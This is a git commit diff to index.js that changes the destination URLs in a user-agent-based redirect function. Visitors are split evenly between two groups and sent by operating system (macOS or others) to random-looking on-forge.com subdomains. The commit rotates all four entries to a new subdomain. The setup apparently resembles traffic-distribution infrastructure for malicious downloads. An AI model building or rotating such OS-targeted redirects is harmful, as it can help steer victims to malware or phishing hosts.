3b69c20c48896ad43a71bfe0c55e9ecd7cc26d7c
animalinside <akshay.anand12@yahoo.com>
2026-05-05 12:39:44 +0530

    Change URLs for Group 1 and Group 2
    Updated macOS and others links for Group 1 and Group 2.

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://rehgwufwddfce.on-forge.com/",
-            others: "https://rehgwufwddfce.on-forge.com/"
+            macos: "https://dsnvsfgvygvrdv.on-forge.com/",
+            others: "https://dsnvsfgvygvrdv.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://rehgwufwddfce.on-forge.com/",
-            others: "https://rehgwufwddfce.on-forge.com/"
+            macos: "https://dsnvsfgvygvrdv.on-forge.com/",
+            others: "https://dsnvsfgvygvrdv.on-forge.com/"
         }
     ];
 
